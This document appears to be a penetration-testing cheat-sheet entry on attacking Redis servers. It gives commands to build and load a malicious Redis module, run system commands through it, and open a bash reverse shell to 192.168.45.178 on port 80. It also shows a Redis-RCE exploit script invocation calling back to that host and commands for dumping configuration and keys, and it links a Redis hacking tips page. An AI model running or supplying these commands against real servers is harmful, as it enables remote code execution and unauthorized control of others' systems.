### Redis

```bash
cd RedisModules-ExecuteCommand
make

# Transfer file onto system through ftp
redis-cli -h $ip
MODULE LOCAL /var/ftp/pub/module.so
system.exec "id"
system.exec "bash -i >& /dev/tcp/192.168.45.178/80 0>&1"
```

```bash
# https://github.com/jas502n/Redis-RCE
python redis-rce.py -r $ip -p 6379 -L 192.168.45.178 -P 80 --file ./exp.so
```

```bash
info
AUTH <username> <password>
client list
CONFIG GET *
INFO keyspace # get databases
KEYS * 
GET <KEY>
```

"https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html"